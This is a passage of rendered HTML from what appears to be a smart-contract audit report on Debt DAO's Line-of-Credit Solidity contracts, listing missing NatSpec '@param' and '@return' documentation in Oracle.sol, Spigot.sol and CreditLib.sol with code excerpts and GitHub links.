class=\"mtk1\">/</span><span class=\"mtk12\">oracle</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Oracle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param token&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">        </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">20         * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> price - the latest price in USD to 8 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">21         */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getLatestAnswer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L19-L22\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L19-L22</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">spigot</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param token&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">        </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">58    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">59         * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> - Claims revenue tokens from the Spigot (push and pull payments) and escrows them for the Owner withdraw later.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">60                   - Calls predefined function in contract settings to claim revenue.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">61                   - Automatically sends portion to Treasury and then escrows Owner&#39;s share</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">62                   - There is no conversion or trade of revenue tokens. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">63         * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    - Assumes the only side effect of calling claimFunc on revenueContract is we receive new tokens.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">64                   - Any other side effects could be dangerous to the Spigot or upstream contracts.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">65         * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\">    - callable by anyone</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">66         * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk3\"> - Contract with registered settings to claim revenue from</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">67         * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">data</span><span class=\"mtk3\"> - Transaction data, including function signature, to properly claim revenue on revenueContract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">68         * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> claimed -  The amount of revenue tokens claimed from revenueContract and split between `owner` and `treasury`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">69        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimRevenue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">71            </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">72:           </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">106        </span><span class=\"mtk4\">*</span><span class=\"mtk1\"> @</span><span class=\"mtk11\">param</span><span class=\"mtk1\"> </span><span class=\"mtk11\">data</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">tx</span><span class=\"mtk1\"> </span><span class=\"mtk11\">data</span><span class=\"mtk1\">, </span><span class=\"mtk11\">including</span><span class=\"mtk1\"> </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">signature</span><span class=\"mtk1\">, </span><span class=\"mtk11\">to</span><span class=\"mtk1\"> </span><span class=\"mtk11\">call</span><span class=\"mtk1\"> </span><span class=\"mtk11\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk11\">with</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">107        </span><span class=\"mtk4\">*</span><span class=\"mtk1\">/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">108:      </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">operate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">        * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">setting</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">Spigot</span><span class=\"mtk1\"> </span><span class=\"mtk12\">settings</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">smart</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\">   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addSpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Setting</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">setting</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">        * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">smart</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">transfer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ownership</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeSpigot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">revenueContract</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">138           </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">139:          </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">157        </span><span class=\"mtk4\">*</span><span class=\"mtk1\"> @</span><span class=\"mtk11\">param</span><span class=\"mtk1\"> </span><span class=\"mtk11\">newOwner</span><span class=\"mtk1\"> - </span><span class=\"mtk11\">Address</span><span class=\"mtk1\"> </span><span class=\"mtk11\">to</span><span class=\"mtk1\"> </span><span class=\"mtk11\">give</span><span class=\"mtk1\"> </span><span class=\"mtk11\">control</span><span class=\"mtk1\"> </span><span class=\"mtk11\">to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">158        </span><span class=\"mtk4\">*</span><span class=\"mtk1\">/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">159:      </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateOwner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newOwner</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">168</span><span class=\"mtk1\">        * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newOperator</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">Address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">give</span><span class=\"mtk1\"> </span><span class=\"mtk12\">control</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">169</span><span class=\"mtk1\">        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateOperator</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newOperator</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">        * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTreasury</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">Address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">divert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">funds</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">        */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newTreasury</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">        * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowed</span><span class=\"mtk1\"> - </span><span class=\"mtk4\">true</span><span class=\"mtk1\">/</span><span class=\"mtk4\">false</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whether</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allow</span><span class=\"mtk1\"> </span><span class=\"mtk4\">this</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">to</span><span class=\"mtk1\"> </span><span class=\"mtk11\">be</span><span class=\"mtk1\"> </span><span class=\"mtk11\">called</span><span class=\"mtk1\"> </span><span class=\"mtk11\">by</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Operator</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">193        </span><span class=\"mtk4\">*</span><span class=\"mtk1\">/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">194:       </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateWhitelistedFunction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">func</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowed</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">204</span><span class=\"mtk1\">        * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Revenue</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> </span><span class=\"mtk12\">that</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">being</span><span class=\"mtk1\"> </span><span class=\"mtk12\">garnished</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spigots</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">       */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">206</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getEscrowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">213</span><span class=\"mtk1\">        * @</span><span class=\"mtk12\">param</span><span class=\"mtk1\"> </span><span class=\"mtk12\">func</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Function</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">check</span><span class=\"mtk1\"> </span><span class=\"mtk12\">on</span><span class=\"mtk1\"> </span><span class=\"mtk12\">whitelist</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">       */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">215</span><span class=\"mtk1\">   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">isWhitelisted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">func</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L57-L72\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L57-L72</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CreditLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param id&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param amount&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param lender&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param token&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">     </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">121       * see ILineOfCredit._createCredit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">122       * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> called by LineOfCredit._createCredit during every repayment function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">123       * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">oracle</span><span class=\"mtk3\"> - interset rate contract used by line that will calculate interest owed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">124      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">create</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">126         </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">127         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">128         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">129         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">130         </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">131     )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">132         </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">133:        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param id&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param amount&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">163     </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">164       * see ILineOfCredit._repay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">165       * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> called by LineOfCredit._repay during every repayment function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">166       * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk3\"> - The lender position being repaid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">167      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">168     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">repay</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">169       ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">170       </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">171       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">172     )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">173       </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">174:      </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param id&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@param amount&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Missing: &#39;@return&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">197     </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">198       * see ILineOfCredit.withdraw</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">199       * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> called by LineOfCredit.withdraw during every repayment function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">200       * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk3\"> - The lender position that is being bwithdrawn from</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">201      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">202     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">203       ILineOfCredit.Credit </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">,</span></span></span>\n<span 